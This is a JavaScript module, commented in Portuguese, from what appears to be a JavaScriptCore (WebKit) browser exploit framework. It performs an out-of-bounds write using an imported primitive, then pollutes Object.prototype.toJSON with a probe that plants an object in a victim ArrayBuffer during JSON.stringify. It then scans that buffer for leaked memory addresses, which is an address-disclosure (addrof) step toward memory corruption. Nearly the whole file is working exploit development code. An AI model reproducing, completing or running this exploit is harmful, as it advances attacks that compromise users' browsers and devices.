// js/script3/testArrayBufferVictimCrash.mjs (v7.1 - Consistência do Objeto Global da Sonda)
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_V28 = "OriginalHeisenbug_Plus_Addrof_v7_1_GlobalConsistency";

const CRITICAL_OOB_WRITE_VALUE  = 0xFFFFFFFF;
const VICTIM_AB_SIZE = 256;

// Objeto global para ser modificado pela sonda.
let g_probeDetailsFromToJSON = null;

// Variáveis globais acessadas pela sonda (devem ser definidas antes de JSON.stringify)
let victim_ab_ref_for_original_test = null;
let object_to_leak_A = null;
const prep_val_1 = 0.5;
const prep_val_2 = 1.5;

function toJSON_Probe_GlobalObjectModifier() {
    if (!g_probeDetailsFromToJSON) {
        console.error("[toJSON_Probe_GlobalObjectModifier] g_probeDetailsFromToJSON não foi inicializado!");
        return { probe_error_no_global_details: true }; // Retornar algo simples em caso de erro grave
    }

    g_probeDetailsFromToJSON.probe_variant = FNAME_MODULE_V28 + "_Probe";
    g_probeDetailsFromToJSON.probe_called_count = (g_probeDetailsFromToJSON.probe_called_count || 0) + 1;
    const current_this_type = Object.prototype.toString.call(this);
    g_probeDetailsFromToJSON.last_this_type_in_probe = current_this_type;

    try {
        if (this === victim_ab_ref_for_original_test && current_this_type === '[object Object]') {
            // Só logar esta mensagem detalhada uma vez por execução de stringify, quando a Heisenbug é detectada pela primeira vez.
            if (!g_probeDetailsFromToJSON.heisenbug_condition_met_in_probe) {
                logS3(`[${g_probeDetailsFromToJSON.probe_variant}] HEISENBUG DETECTADA NA SONDA! Tipo de 'this': ${current_this_type}. Tentando escritas... (Chamada ${g_probeDetailsFromToJSON.probe_called_count})`, "vuln");
            }
            
            g_probeDetailsFromToJSON.heisenbug_condition_met_in_probe = true; // Definir sempre que a condição for atendida
            g_probeDetailsFromToJSON.this_type_when_heisenbug_met = current_this_type;

            try {
                this[10] = prep_val_1;
                g_probeDetailsFromToJSON.prep_val_1_written_in_probe = true;
                this[11] = prep_val_2;
                g_probeDetailsFromToJSON.prep_val_2_written_in_probe = true;
            } catch (e_prep) {
                if(!g_probeDetailsFromToJSON.error_in_probe) g_probeDetailsFromToJSON.error_in_probe = "";
                g_probeDetailsFromToJSON.error_in_probe += `PrepErr: ${e_prep.message}; `;
            }

            if (object_to_leak_A) {
                this[0] = object_to_leak_A;
                g_probeDetailsFromToJSON.obj_A_written_in_probe = true;
            }
        } else if (this === victim_ab_ref_for_original_test) {
            if (!g_probeDetailsFromToJSON.heisenbug_condition_met_in_probe) { // Se a Heisenbug ainda não foi "travada"
                 logS3(`[${g_probeDetailsFromToJSON.probe_variant}] Sonda chamada no victim_ab, tipo ${current_this_type} (Chamada ${g_probeDetailsFromToJSON.probe_called_count})`, "info");
            }
        }
    } catch (e) {
        if(!g_probeDetailsFromToJSON.error_in_probe) g_probeDetailsFromToJSON.error_in_probe = "";
        g_probeDetailsFromToJSON.error_in_probe += `MainProbeErr: ${e.name}: ${e.message}; `;
    }
    // Retornar um objeto placeholder simples, NÃO o g_probeDetailsFromToJSON
    return { toJSON_probe_executed_placeholder: true };
}


export async function executeArrayBufferVictimCrashTest() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_V28}.triggerAndAddrof`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Heisenbug e Addrof com Objeto Global Consistente ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_V28} Inic...`;

    // Inicializar o objeto de detalhes globais da sonda AQUI
    g_probeDetailsFromToJSON = {
        probe_variant: "UNINITIALIZED",
        probe_called_count: 0,
        last_this_type_in_probe: "N/A",
        heisenbug_condition_met_in_probe: false,
        this_type_when_heisenbug_met: "N/A",
        obj_A_written_in_probe: false,
        prep_val_1_written_in_probe: false,
        prep_val_2_written_in_probe: false,
        error_in_probe: null
    };

    victim_ab_ref_for_original_test = null;
    object_to_leak_A = { marker: "ObjA_v7_1", id: Date.now() };

    let errorCapturedMain = null;
    let stringifyOutput = null;
    
    let addrof_result = {
        success: false,
        leaked_address_as_double: null,
        leaked_address_as_int64: null,
        found_at_index: -1,
        message: "Addrof: Não tentado ou Heisenbug falhou."
    };
        
    const corruptionTargetOffsetInOOBAB = 0x7C;
    const fillPattern = 0.123456789101112;
    const ITERATIVE_READ_COUNT = 16;

    try {
        await triggerOOB_primitive({ force_reinit: true });
         if (!oob_array_buffer_real && typeof oob_write_absolute !== 'function') {
             throw new Error("OOB Init falhou ou oob_write_absolute não está disponível.");
        }
        logS3("Ambiente OOB inicializado.", "info", FNAME_CURRENT_TEST);
        logS3(`    Alvo da corrupção OOB em oob_array_buffer_real: ${toHex(corruptionTargetOffsetInOOBAB)}`, "info", FNAME_CURRENT_TEST);

        logS3(`PASSO 1: Escrevendo valor CRÍTICO ${toHex(CRITICAL_OOB_WRITE_VALUE)} em oob_array_buffer_real[${toHex(corruptionTargetOffsetInOOBAB)}]...`, "warn", FNAME_CURRENT_TEST);
        oob_write_absolute(corruptionTargetOffsetInOOBAB, CRITICAL_OOB_WRITE_VALUE, 4);
        logS3(`  Escrita OOB crítica em ${toHex(corruptionTargetOffsetInOOBAB)} realizada.`, "info", FNAME_CURRENT_TEST);
        
        await PAUSE_S3(100); 

        victim_ab_ref_for_original_test = new ArrayBuffer(VICTIM_AB_SIZE);
        let float64_view_on_victim = new Float64Array(victim_ab_ref_for_original_test);
        float64_view_on_victim.fill(fillPattern);

        logS3(`PASSO 2: victim_ab (tamanho ${VICTIM_AB_SIZE} bytes) criado. View preenchida com ${float64_view_on_victim[0]}. Tentando JSON.stringify com ${toJSON_Probe_GlobalObjectModifier.name}...`, "test", FNAME_CURRENT_TEST);
        
        const ppKey = 'toJSON';
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        let pollutionApplied = false;

        try {
            Object.defineProperty(Object.prototype, ppKey, {
                value: toJSON_Probe_GlobalObjectModifier,
                writable: true, configurable: true, enumerable: false
            });
            pollutionApplied = true;
            logS3(`  Object.prototype.${ppKey} poluído com ${toJSON_Probe_GlobalObjectModifier.name}.`, "info", FNAME_CURRENT_TEST);

            logS3(`  Chamando JSON.stringify(victim_ab_ref_for_original_test)...`, "warn", FNAME_CURRENT_TEST);
            stringifyOutput = JSON.stringify(victim_ab_ref_for_original_test); 
            
            logS3(`  JSON.stringify(victim_ab_ref_for_original_test) completou. Retorno da sonda (stringifyOutput): ${stringifyOutput ? JSON.stringify(stringifyOutput) : 'N/A'}`, "info", FNAME_CURRENT_TEST);
            // Logar o g_probeDetailsFromToJSON que foi modificado pela sonda.
            logS3(`  Detalhes COMPLETOS da sonda (g_probeDetailsFromToJSON): ${g_probeDetailsFromToJSON ? JSON.stringify(g_probeDetailsFromToJSON) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);

            if (g_probeDetailsFromToJSON && g_probeDetailsFromToJSON.heisenbug_condition_met_in_probe) {
                logS3(`  HEISENBUG CONFIRMADA (via flag da sonda)! Tipo quando Heisenbug ocorreu: ${g_probeDetailsFromToJSON.this_type_when_heisenbug_met}. Chamadas da sonda: ${g_probeDetailsFromToJSON.probe_called_count}.`, "vuln");
                logS3(`    Status das escritas na sonda: ObjA: ${g_probeDetailsFromToJSON.obj_A_written_in_probe}, PrepVal1: ${g_probeDetailsFromToJSON.prep_val_1_written_in_probe}, PrepVal2: ${g_probeDetailsFromToJSON.prep_val_2_written_in_probe}`, "info");
                if(g_probeDetailsFromToJSON.error_in_probe) logS3(`    Erro(s) na sonda: ${g_probeDetailsFromToJSON.error_in_probe}`, "error");

                if (!g_probeDetailsFromToJSON.obj_A_written_in_probe && !g_probeDetailsFromToJSON.prep_val_1_written_in_probe && !g_probeDetailsFromToJSON.prep_val_2_written_in_probe) {
                    logS3("    ALERTA: Heisenbug detectada, mas NENHUMA flag de escrita da sonda está como true, embora devessem ter sido tentadas.", "warn");
                }

                logS3(`PASSO 3: Lendo iterativamente os primeiros ${ITERATIVE_READ_COUNT} slots de float64_view_on_victim...`, "warn", FNAME_CURRENT_TEST);
                let foundPotentialPointer = false;
                for (let i = 0; i < ITERATIVE_READ_COUNT; i++) {
                    if (i >= float64_view_on_victim.length) break; 

                    const val_double = float64_view_on_victim[i];
                    let temp_buf = new ArrayBuffer(8); new Float64Array(temp_buf)[0] = val_double;
                    const val_int64 = new AdvancedInt64(new Uint32Array(temp_buf)[0], new Uint32Array(temp_buf)[1]);
                    
                    logS3(`  view[${i}]: double=${val_double}, int64=${val_int64.toString(true)}`, "leak", FNAME_CURRENT_TEST);

                    if (g_probeDetailsFromToJSON.obj_A_written_in_probe && val_double !== 0 && val_double !== fillPattern &&
                        (val_int64.high() < 0x00020000 || (val_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
                        logS3(`  !!!! VALOR LIDO em view[${i}] PARECE UM PONTEIRO POTENCIAL !!!!`, "vuln", FNAME_CURRENT_TEST);
                        if (!foundPotentialPointer) { 
                            addrof_result.success = true;
                            addrof_result.leaked_address_as_double = val_double;
                            addrof_result.leaked_address_as_int64 = val_int64;
                            addrof_result.found_at_index = i;
                            addrof_result.message = `Heisenbug confirmada E leitura de view[${i}] sugere um ponteiro.`;
                            foundPotentialPointer = true; 
                        }
                    }
                }

                if (addrof_result.success) {
                    document.title = `${FNAME_MODULE_V28}: Addr? Encontrado @${addrof_result.found_at_index}!`;
                } else {
                     document.title = `${FNAME_MODULE_V28}: Heisenbug OK, Addr Falhou`;
                     if (g_probeDetailsFromToJSON.obj_A_written_in_probe || g_probeDetailsFromToJSON.prep_val_1_written_in_probe) {
                        addrof_result.message = "Heisenbug ok e escritas na sonda reportadas, mas nenhum ponteiro promissor encontrado na varredura da view.";
                     } else {
                        addrof_result.message = "Heisenbug ok, mas escritas na sonda NÃO foram reportadas como ocorridas. Verifique a lógica da sonda.";
                     }
                }

            } else {
                let msg = "Condição da Heisenbug NÃO foi confirmada pela flag da sonda (g_probeDetailsFromToJSON.heisenbug_condition_met_in_probe).";
                if(g_probeDetailsFromToJSON) msg += ` Último tipo obs na sonda: ${g_probeDetailsFromToJSON.last_this_type_in_probe}. Contagem de chamadas da sonda: ${g_probeDetailsFromToJSON.probe_called_count}.`;
                addrof_result.message = msg;
                logS3(`  ALERTA: ${msg}`, "error", FNAME_CURRENT_TEST);
                document.title = `${FNAME_MODULE_V28}: Heisenbug Falhou`;
            }

        } catch (e_str) {
            errorCapturedMain = e_str;
            logS3(`    ERRO CRÍTICO durante JSON.stringify ou lógica de addrof: ${e_str.name} - ${e_str.message}${e_str.stack ? '\n'+e_str.stack : ''}`, "critical", FNAME_CURRENT_TEST);
            document.title = `${FNAME_MODULE_V28}: Stringify/Addrof ERR`;
            addrof_result.message = `Erro na execução principal: ${e_str.name} - ${e_str.message}`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
                else delete Object.prototype[ppKey];
            }
        }

    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        logS3(`ERRO CRÍTICO GERAL no teste: ${e_outer_main.name} - ${e_outer_main.message}`, "critical", FNAME_CURRENT_TEST);
        if (e_outer_main.stack) logS3(`Stack: ${e_outer_main.stack}`, "critical", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MODULE_V28} FALHOU CRITICAMENTE`;
        addrof_result.message = `Erro geral no teste: ${e_outer_main.name}`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Resultado Addrof: Success=${addrof_result.success}, Index=${addrof_result.found_at_index}, Msg='${addrof_result.message}'`, addrof_result.success ? "good" : "warn", FNAME_CURRENT_TEST);
        if(addrof_result.leaked_address_as_int64){
            logS3(`  Addrof (Int64): ${addrof_result.leaked_address_as_int64.toString(true)}`, "leak", FNAME_CURRENT_TEST);
        }
        // Limpar globais para a próxima execução do teste, se houver
        victim_ab_ref_for_original_test = null;
        object_to_leak_A = null;
        g_probeDetailsFromToJSON = null;
    }
    // Retornar g_probeDetailsFromToJSON para que runHeisenbugReproStrategy_ABVictim possa logá-lo corretamente
    return { 
        errorOccurred: errorCapturedMain, 
        potentiallyCrashed: false,
        stringifyResult: stringifyOutput, 
        toJSON_details: g_probeDetailsFromToJSON, // IMPORTANTE
        addrof_attempt_result: addrof_result
    };
}
